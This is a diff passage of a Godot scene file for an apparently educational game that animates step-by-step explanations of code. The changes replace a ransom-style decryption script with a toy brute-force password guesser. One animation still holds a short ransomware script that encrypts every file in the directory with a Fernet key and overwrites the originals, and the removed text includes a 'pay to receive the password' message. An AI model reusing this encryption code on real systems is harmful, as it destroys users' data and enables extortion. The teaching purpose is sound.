-"transitions": PackedFloat32Array(1),
-"update": 0,
-"values": [Vector2(0.1, 2.01)]
-}
-tracks/5/type = "value"
-tracks/5/imported = false
-tracks/5/enabled = true
-tracks/5/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_size")
-tracks/5/interp = 1
-tracks/5/loop_wrap = true
-tracks/5/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 0,
-"values": [Vector2(3.735, 0.555)]
-}
-tracks/6/type = "value"
-tracks/6/imported = false
-tracks/6/enabled = true
-tracks/6/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:scroll_vertical")
-tracks/6/interp = 1
-tracks/6/loop_wrap = true
-tracks/6/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 0,
-"values": [19.0]
+"values": [13.965]
 }
 
 [sub_resource type="Animation" id="Animation_x5n46"]
@@ -1321,33 +1000,21 @@ tracks/0/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": ["import os from cryptography.fernet
-import fernet
+"values": ["import random
 
-allfiles = []
-for file in os.listdir():
-	if file == 'malware.py' or file == 'key.key' or file == 'decr.py':
-		continue
-	if os.path.isfile(file):
-		allfiles.append(file)
+character = \"0123456789abcdefghijklmnopqrstuvwzyzñABCDEFG
+HIJKLMNOPQRSTUVWXYZÑ \"
+character_list = list(character)
 
-print(allfiles)
+password = \"Cypher2025\"
+guess = \"\"
 
-with open('key.key', 'rb') as key:
-		password = key.read()
-passphrase = 'WhiteHat'
-userpass = input('Enter the password you received from us:')
-
-if userpass == passphrase:
-	for file in allfiles:
-		with open(file, 'rb') as thefile:
-			 contents = thefile.read()
-		content_decr = Fernet(password).decrypt(contents)
-		with open(file, 'wb') as thefile:
- 			thefile.write(content_decr)
-		print(\"You got your files back\")
-else: 
-        print (\"Wrong password! Pay to receive the right password\")"]
+while (guess != password):
+	guess = random.choices(character_list, k=len(password))
+	print(guess)
+	guess = \"\".join(guess)
+	print(guess)
+print(\"The password is \"+ guess)"]
 }
 tracks/1/type = "value"
 tracks/1/imported = false
@@ -1371,7 +1038,7 @@ tracks/2/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": ["Finally, it tells the user: “You got your files back.” At this point, the files are restored, just like they were before being locked."]
+"values": ["It shows the list form so we can see the raw characters, like ['7','a']."]
 }
 tracks/3/type = "value"
 tracks/3/imported = false
@@ -1383,7 +1050,7 @@ tracks/3/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": ["Decrypt the Files"]
+"values": ["Make a random guess"]
 }
 tracks/4/type = "value"
 tracks/4/imported = false
@@ -1407,7 +1074,7 @@ tracks/5/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 0,
-"values": [Vector2(3.735, 0.335)]
+"values": [Vector2(3.735, 0.32)]
 }
 tracks/6/type = "value"
 tracks/6/imported = false
@@ -1419,7 +1086,7 @@ tracks/6/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 0,
-"values": [19.0]
+"values": [13.965]
 }
 
 [sub_resource type="Animation" id="Animation_x2hu1"]
@@ -1434,33 +1101,21 @@ tracks/0/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": ["import os from cryptography.fernet
-import fernet
+"values": ["import random
 
-allfiles = []
-for file in os.listdir():
-	if file == 'malware.py' or file == 'key.key' or file == 'decr.py':
-		continue
-	if os.path.isfile(file):
-		allfiles.append(file)
+character = \"0123456789abcdefghijklmnopqrstuvwzyzñABCDEFG
+HIJKLMNOPQRSTUVWXYZÑ \"
+character_list = list(character)
 
-print(allfiles)
+password = \"Cypher2025\"
+guess = \"\"
 
-with open('key.key', 'rb') as key:
-		password = key.read()
-passphrase = 'WhiteHat'
-userpass = input('Enter the password you received from us:')
-
-if userpass == passphrase:
-	for file in allfiles:
-		with open(file, 'rb') as thefile:
-			 contents = thefile.read()
-		content_decr = Fernet(password).decrypt(contents)
-		with open(file, 'wb') as thefile:
- 			thefile.write(content_decr)
-		print(\"You got your files back\")
-else: 
-        print (\"Wrong password! Pay to receive the right password\")"]
+while (guess != password):
+	guess = random.choices(character_list, k=len(password))
+	print(guess)
+	guess = \"\".join(guess)
+	print(guess)
+print(\"The password is \"+ guess)"]
 }
 tracks/1/type = "value"
 tracks/1/imported = false
@@ -1484,7 +1139,7 @@ tracks/2/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": ["If the user types the wrong passphrase, the program refuses to continue. The files stay locked, and the script shows a threatening message that mimics how real ransomware works: it tells you to pay money to get the right password."]
+"values": ["It convert the list together into a single string, like this Example: ['7','a'] → 7a."]
 }
 tracks/3/type = "value"
 tracks/3/imported = false
@@ -1496,7 +1151,7 @@ tracks/3/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": ["Handle Wrong Passwords"]
+"values": ["Join characters into a word"]
 }
 tracks/4/type = "value"
 tracks/4/imported = false
@@ -1508,7 +1163,7 @@ tracks/4/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 0,
-"values": [Vector2(0.1, 3.235)]
+"values": [Vector2(0.1, 2.93)]
 }
 tracks/5/type = "value"
 tracks/5/imported = false
@@ -1520,7 +1175,7 @@ tracks/5/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 0,
-"values": [Vector2(3.735, 0.615)]
+"values": [Vector2(3.735, 0.3)]
 }
 tracks/6/type = "value"
 tracks/6/imported = false
@@ -1532,7 +1187,211 @@ tracks/6/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 0,
-"values": [19.0]
+"values": [25.66]
+}
+
+[sub_resource type="Animation" id="Animation_8yhgl"]
+resource_name = "ransomware_step_12"
+tracks/0/type = "value"
+tracks/0/imported = false
+tracks/0/enabled = true
+tracks/0/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:text")
+tracks/0/interp = 1
+tracks/0/loop_wrap = true
+tracks/0/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["import random
+
+character = \"0123456789abcdefghijklmnopqrstuvwzyzñABCDEFG
+HIJKLMNOPQRSTUVWXYZÑ \"
+character_list = list(character)
+
+password = \"Cypher2025\"
+guess = \"\"
+
+while (guess != password):
+	guess = random.choices(character_list, k=len(password))
+	print(guess)
+	guess = \"\".join(guess)
+	print(guess)
+print(\"The password is \"+ guess)"]
+}
+tracks/1/type = "value"
+tracks/1/imported = false
+tracks/1/enabled = true
+tracks/1/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:visible")
+tracks/1/interp = 1
+tracks/1/loop_wrap = true
+tracks/1/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [true]
+}
+tracks/2/type = "value"
+tracks/2/imported = false
+tracks/2/enabled = true
+tracks/2/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer/RichTextLabel:text")
+tracks/2/interp = 1
+tracks/2/loop_wrap = true
+tracks/2/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["Finally, the encrypted version replaces the original file by writing it back in binary write mode (wb).
+
+At this point, the files are no longer usable in their normal form — they have been locked with the password key."]
+}
+tracks/3/type = "value"
+tracks/3/imported = false
+tracks/3/enabled = true
+tracks/3/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer:title")
+tracks/3/interp = 1
+tracks/3/loop_wrap = true
+tracks/3/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["Encrypting the Files"]
+}
+tracks/4/type = "value"
+tracks/4/imported = false
+tracks/4/enabled = true
+tracks/4/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_position")
+tracks/4/interp = 1
+tracks/4/loop_wrap = true
+tracks/4/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(0.135, 2.615)]
+}
+tracks/5/type = "value"
+tracks/5/imported = false
+tracks/5/enabled = true
+tracks/5/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_size")
+tracks/5/interp = 1
+tracks/5/loop_wrap = true
+tracks/5/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(3.735, 0.59)]
+}
+tracks/6/type = "value"
+tracks/6/imported = false
+tracks/6/enabled = true
+tracks/6/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:scroll_vertical")
+tracks/6/interp = 1
+tracks/6/loop_wrap = true
+tracks/6/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [13.965]
+}
+
+[sub_resource type="Animation" id="Animation_h0h0r"]
+resource_name = "ransomware_step_13"
+tracks/0/type = "value"
+tracks/0/imported = false
+tracks/0/enabled = true
+tracks/0/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:text")
+tracks/0/interp = 1
+tracks/0/loop_wrap = true
+tracks/0/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["import random
+
+character = \"0123456789abcdefghijklmnopqrstuvwzyzñABCDEFG
+HIJKLMNOPQRSTUVWXYZÑ \"
+character_list = list(character)
+
+password = \"Cypher2025\"
+guess = \"\"
+
+while (guess != password):
+	guess = random.choices(character_list, k=len(password))
+	print(guess)
+	guess = \"\".join(guess)
+	print(guess)
+print(\"The password is \"+ guess)"]
+}
+tracks/1/type = "value"
+tracks/1/imported = false
+tracks/1/enabled = true
+tracks/1/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:visible")
+tracks/1/interp = 1
+tracks/1/loop_wrap = true
+tracks/1/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [true]
+}
+tracks/2/type = "value"
+tracks/2/imported = false
+tracks/2/enabled = true
+tracks/2/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer/RichTextLabel:text")
+tracks/2/interp = 1
+tracks/2/loop_wrap = true
+tracks/2/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["When the loop ends, it means the computer has finally found the correct password combination. Then it will print the matched password."]
+}
+tracks/3/type = "value"
+tracks/3/imported = false
+tracks/3/enabled = true
+tracks/3/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer:title")
+tracks/3/interp = 1
+tracks/3/loop_wrap = true
+tracks/3/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [" Print the result"]
+}
+tracks/4/type = "value"
+tracks/4/imported = false
+tracks/4/enabled = true
+tracks/4/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_position")
+tracks/4/interp = 1
+tracks/4/loop_wrap = true
+tracks/4/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(0.135, 3.555)]
+}
+tracks/5/type = "value"
+tracks/5/imported = false
+tracks/5/enabled = true
+tracks/5/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_size")
+tracks/5/interp = 1
+tracks/5/loop_wrap = true
+tracks/5/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(3.735, 0.28)]
+}
+tracks/6/type = "value"
+tracks/6/imported = false
+tracks/6/enabled = true
+tracks/6/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:scroll_vertical")
+tracks/6/interp = 1
+tracks/6/loop_wrap = true
+tracks/6/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [13.965]
 }
 
 [sub_resource type="Animation" id="Animation_fkojw"]
@@ -1548,33 +1407,29 @@ tracks/0/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": ["import os from cryptography.fernet
+"values": ["import os from cryptography.fernet 
 import fernet
 
-allfiles = []
+allfiles = [ ]
 for file in os.listdir():
-	if file == 'malware.py' or file == 'key.key' or file == 'decr.py':
+	if file == 'malware.py' or file == 'key.key' or file == ' decr.py':
 		continue
 	if os.path.isfile(file):
 		allfiles.append(file)
+print (allfiles)
 
-print(allfiles)
+key = Fernet.generate_key()
+with open ('key.key', 'wb') as thekey: 
+	thekey.write(key)
 
-with open('key.key', 'rb') as key:
-		password = key.read()
-passphrase = 'WhiteHat'
-userpass = input('Enter the password you received from us:')
+for file in allfiles:
+	with open(file, 'rb') as thefile:
+		content = thefile.read()
+	content_encryp = Fernet(key).encrypt(content)
+	with open(file, 'wb') as thefile: 
+		thefile.write(content_encryp)
 
-if userpass == passphrase:
-	for file in allfiles:
-		with open(file, 'rb') as thefile:
-			 contents = thefile.read()
-		content_decr = Fernet(password).decrypt(contents)
-		with open(file, 'wb') as thefile:
- 			thefile.write(content_decr)
-		print(\"You got your files back\")
-else: 
-        print (\"Wrong password! Pay to receive the right password\")"]
+print('All your files have been encrypted')"]
 }
 tracks/1/type = "value"
 tracks/1/imported = false
@@ -1598,7 +1453,8 @@ tracks/2/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": [""]
+"values": ["
+"]
 }
 tracks/3/type = "value"
 tracks/3/imported = false
@@ -1622,7 +1478,7 @@ tracks/4/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 0,
-"values": [Vector2(0.1, 3.235)]
+"values": [Vector2(0.135, 3.555)]
 }
 tracks/5/type = "value"
 tracks/5/imported = false
@@ -1634,7 +1490,7 @@ tracks/5/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 0,
-"values": [Vector2(3.735, 0.615)]
+"values": [Vector2(3.735, 0.28)]
 }
 tracks/6/type = "value"
 tracks/6/imported = false
@@ -1646,7 +1502,7 @@ tracks/6/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 0,
-"values": [19.0]
+"values": [13.965]
 }
 tracks/7/type = "value"
 tracks/7/imported = false
@@ -1670,7 +1526,7 @@ tracks/8/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": ["decr.exe"]
+"values": ["brute_force.exe"]
 }
 tracks/9/type = "value"
 tracks/9/imported = false
@@ -1697,21 +1553,225 @@ tracks/10/keys = {
 "values": [true]
 }
 
+[sub_resource type="Animation" id="Animation_gi6xj"]
+resource_name = "ransomware_step_02"
+tracks/0/type = "value"
+tracks/0/imported = false
+tracks/0/enabled = true
+tracks/0/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:text")
+tracks/0/interp = 1
+tracks/0/loop_wrap = true
+tracks/0/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["import random
+
+character = \"0123456789abcdefghijklmnopqrstuvwzyzñABCDEFG
+HIJKLMNOPQRSTUVWXYZÑ \"
+character_list = list(character)
+
+password = \"Cypher2025\"
+guess = \"\"
+
+while (guess != password):
+	guess = random.choices(character_list, k=len(password))
+	print(guess)
+	guess = \"\".join(guess)
+	print(guess)
+print(\"The password is \"+ guess)"]
+}
+tracks/1/type = "value"
+tracks/1/imported = false
+tracks/1/enabled = true
+tracks/1/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:visible")
+tracks/1/interp = 1
+tracks/1/loop_wrap = true
+tracks/1/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [true]
+}
+tracks/2/type = "value"
+tracks/2/imported = false
+tracks/2/enabled = true
+tracks/2/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer/RichTextLabel:text")
+tracks/2/interp = 1
+tracks/2/loop_wrap = true
+tracks/2/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["It’s like telling Python, ‘Hey, I want to use tools that can generate random numbers or random choices.’ Without this line, the program won’t know how to pick random letters."]
+}
+tracks/3/type = "value"
+tracks/3/imported = false
+tracks/3/enabled = true
+tracks/3/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer:title")
+tracks/3/interp = 1
+tracks/3/loop_wrap = true
+tracks/3/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["Import the random module"]
+}
+tracks/4/type = "value"
+tracks/4/imported = false
+tracks/4/enabled = true
+tracks/4/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_position")
+tracks/4/interp = 1
+tracks/4/loop_wrap = true
+tracks/4/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(0.135, 0.135)]
+}
+tracks/5/type = "value"
+tracks/5/imported = false
+tracks/5/enabled = true
+tracks/5/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_size")
+tracks/5/interp = 1
+tracks/5/loop_wrap = true
+tracks/5/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(3.025, 0.26)]
+}
+tracks/6/type = "value"
+tracks/6/imported = false
+tracks/6/enabled = true
+tracks/6/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:scroll_vertical")
+tracks/6/interp = 1
+tracks/6/loop_wrap = true
+tracks/6/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [0.0]
+}
+
+[sub_resource type="Animation" id="Animation_jxoe6"]
+resource_name = "ransomware_step_09"
+tracks/0/type = "value"
+tracks/0/imported = false
+tracks/0/enabled = true
+tracks/0/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:text")
+tracks/0/interp = 1
+tracks/0/loop_wrap = true
+tracks/0/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["import random
+
+character = \"0123456789abcdefghijklmnopqrstuvwzyzñABCDEFG
+HIJKLMNOPQRSTUVWXYZÑ \"
+character_list = list(character)
+
+password = \"Cypher2025\"
+guess = \"\"
+
+while (guess != password):
+	guess = random.choices(character_list, k=len(password))
+	print(guess)
+	guess = \"\".join(guess)
+	print(guess)
+print(\"The password is \"+ guess)"]
+}
+tracks/1/type = "value"
+tracks/1/imported = false
+tracks/1/enabled = true
+tracks/1/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:visible")
+tracks/1/interp = 1
+tracks/1/loop_wrap = true
+tracks/1/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [true]
+}
+tracks/2/type = "value"
+tracks/2/imported = false
+tracks/2/enabled = true
+tracks/2/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer/RichTextLabel:text")
+tracks/2/interp = 1
+tracks/2/loop_wrap = true
+tracks/2/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["It makes sure the guess has the same number of letters as the password."]
+}
+tracks/3/type = "value"
+tracks/3/imported = false
+tracks/3/enabled = true
+tracks/3/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer:title")
+tracks/3/interp = 1
+tracks/3/loop_wrap = true
+tracks/3/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["Make a random guess"]
+}
+tracks/4/type = "value"
+tracks/4/imported = false
+tracks/4/enabled = true
+tracks/4/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_position")
+tracks/4/interp = 1
+tracks/4/loop_wrap = true
+tracks/4/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(0.1, 2.305)]
+}
+tracks/5/type = "value"
+tracks/5/imported = false
+tracks/5/enabled = true
+tracks/5/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_size")
+tracks/5/interp = 1
+tracks/5/loop_wrap = true
+tracks/5/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(3.735, 0.285)]
+}
+tracks/6/type = "value"
+tracks/6/imported = false
+tracks/6/enabled = true
+tracks/6/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:scroll_vertical")
+tracks/6/interp = 1
+tracks/6/loop_wrap = true
+tracks/6/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [13.965]
+}
+
 [sub_resource type="AnimationLibrary" id="AnimationLibrary_de0th"]
 _data = {
 &"RESET": SubResource("Animation_i7g13"),
 &"ransomware_step_01": SubResource("Animation_oekl0"),
-&"ransomware_step_02": SubResource("Animation_k4s4l"),
+&"ransomware_step_02": SubResource("Animation_gi6xj"),
 &"ransomware_step_03": SubResource("Animation_xwue7"),
 &"ransomware_step_04": SubResource("Animation_cxtjw"),
 &"ransomware_step_05": SubResource("Animation_wf7ls"),
 &"ransomware_step_06": SubResource("Animation_vuf0p"),
 &"ransomware_step_07": SubResource("Animation_gu46y"),
 &"ransomware_step_08": SubResource("Animation_de0th"),
-&"ransomware_step_09": SubResource("Animation_31cwg"),
+&"ransomware_step_09": SubResource("Animation_jxoe6"),
 &"ransomware_step_10": SubResource("Animation_x5n46"),
 &"ransomware_step_11": SubResource("Animation_x2hu1"),
-&"ransomware_step_12": SubResource("Animation_fkojw")
+&"ransomware_step_12": SubResource("Animation_8yhgl"),
+&"ransomware_step_13": SubResource("Animation_h0h0r"),
+&"ransomware_step_14": SubResource("Animation_fkojw")
 }
 
 [sub_resource type="StyleBoxFlat" id="StyleBoxFlat_h8m8q"]
@@ -1743,7 +1803,7 @@ anchor_right = 1.0
 anchor_bottom = 1.0
 grow_horizontal = 2
 grow_vertical = 2
-script = ExtResource("1_oyu1b")
+script = ExtResource("1_gi6xj")
 
 [node name="Background" type="ColorRect" parent="."]
 layout_mode = 1
@@ -1766,7 +1826,7 @@ metadata/_edit_use_anchors_ = true
 
 [node name="Label" type="Label" parent="Header"]
 layout_mode = 2
-theme_override_fonts/font = ExtResource("2_peaif")
+theme_override_fonts/font = ExtResource("2_jxoe6")
 text = "VScode"
 
 [node name="Body" type="HBoxContainer" parent="."]
@@ -1796,13 +1856,13 @@ layout_mode = 2
 [node name="FoldableContainer" type="FoldableContainer" parent="Body/ExplanationPanel/VBoxContainer"]
 layout_mode = 2
 theme = SubResource("Theme_x5n46")
-title = "Decyption Script"
+title = "⚠️BRUTE FORCE ALERT⚠️"
 
 [node name="RichTextLabel" type="RichTextLabel" parent="Body/ExplanationPanel/VBoxContainer/FoldableContainer"]
 custom_minimum_size = Vector2(0, 531.305)
 layout_mode = 2
 bbcode_enabled = true
-text = "A decryption script’s role is to unlock encrypted files using the correct key. It loads the key, runs the decryption algorithm, and restores the original data. Without it, the files remain locked, unreadable, and useless."
+text = "A brute force attack is a way hackers try to break into a system by guessing the password or key through every possible combination. Instead of using smart tricks, they rely on the computer’s speed to test thousands or even millions of possibilities until the right one works. Think of it like trying to open a lock by testing every single key until one finally fits. While this method always works eventually, it can take a very long time if the password is strong and complex."
 
 [node name="CodeContainer" type="VBoxContainer" parent="Body"]
 layout_mode = 2
@@ -1830,33 +1890,22 @@ theme_override_styles/normal = SubResource("StyleBoxEmpty_qmx2e")
 theme_override_styles/focus = SubResource("StyleBoxEmpty_0tp54")
 theme_override_styles/read_only = SubResource("StyleBoxEmpty_h8m8q")
 theme_override_styles/completion = SubResource("StyleBoxEmpty_pkbn6")
-text = "import os from cryptography.fernet
-import fernet
+text = "import random
 
-allfiles = []
-for file in os.listdir():
-	if file == 'malware.py' or file == 'key.key' or file == 'decr.py':
-		continue
-	if os.path.isfile(file):
-		allfiles.append(file)
+character = \"0123456789abcdefghijklmnopqrstuvwzyzñABCDEFGHIJKLMNOPQ
+RSTUVWXYZÑ \"
+character_list = list(character)
 
-print(allfiles)
+password = \"Cypher2025\"
+guess = \"\"
 
-with open('key.key', 'rb') as key:
-		password = key.read()
-passphrase = 'WhiteHat'
-userpass = input('Enter the password you received from us:')
-
-if userpass == passphrase:
-	for file in allfiles:
-		with open(file, 'rb') as thefile:
-			 contents = thefile.read()
-		content_decr = Fernet(password).decrypt(contents)
-		with open(file, 'wb') as thefile:
- 			thefile.write(content_decr)
-		print(\"You got your files back\")
-else: 
-        print (\"Wrong password! Pay to receive the right password\")"
+while (guess != password):
+	guess = random.choices(character_list, k=len(password))
+	print(guess)
+	guess = \"\".join(guess)
+	print(guess)
+print(\"The password is \"+ guess)
+"
 wrap_mode = 1
 autowrap_mode = 2
 gutters_draw_line_numbers = true
@@ -1872,7 +1921,7 @@ metadata/_edit_use_anchors_ = true
 visible = false
 custom_minimum_size = Vector2(0, 70)
 layout_mode = 2
-theme_override_fonts/normal_font = ExtResource("3_h2uiv")
+theme_override_fonts/normal_font = ExtResource("3_t1hkx")
 theme_override_font_sizes/normal_font_size = 20
 bbcode_enabled = true
 text = "[wave]This is my text"
@@ -1893,7 +1942,7 @@ grow_horizontal = 2
 grow_vertical = 2
 mouse_filter = 2
 color = Color(0, 0, 0, 0.17254902)
-script = ExtResource("4_c0heo")
+script = ExtResource("4_yxh0e")
 
 [node name="Window" type="PanelContainer" parent="WindowBackground"]
 clip_children = 2
@@ -1922,7 +1971,7 @@ theme_override_styles/panel = SubResource("StyleBoxFlat_pkbn6")
 [node name="Button" type="Button" parent="WindowBackground/Window/WindowContents/WindowHeader"]
 layout_mode = 2
 size_flags_horizontal = 8
-theme_override_fonts/font = ExtResource("3_h2uiv")
+theme_override_fonts/font = ExtResource("3_t1hkx")
 theme_override_styles/normal = SubResource("StyleBoxEmpty_cxtjw")
 theme_override_styles/pressed = SubResource("StyleBoxEmpty_wf7ls")
 theme_override_styles/hover = SubResource("StyleBoxEmpty_vuf0p")
@@ -1953,7 +2002,7 @@ anchors_preset = 0
 offset_right = 40.0
 offset_bottom = 40.0
 
-[node name="Next" parent="Debug" instance=ExtResource("5_ad76e")]
+[node name="Next" parent="Debug" instance=ExtResource("5_n672d")]
 layout_mode = 1
 anchor_left = 0.736111
 anchor_top = 0.802469
@@ -1964,7 +2013,7 @@ offset_top = 487.90118
 offset_right = 962.3815
 offset_bottom = 522.6172
 
-[node name="Back" parent="Debug" instance=ExtResource("6_8rapc")]
+[node name="Back" parent="Debug" instance=ExtResource("6_fkg8t")]
 layout_mode = 1
 anchor_left = 0.131944
 anchor_top = 0.802469
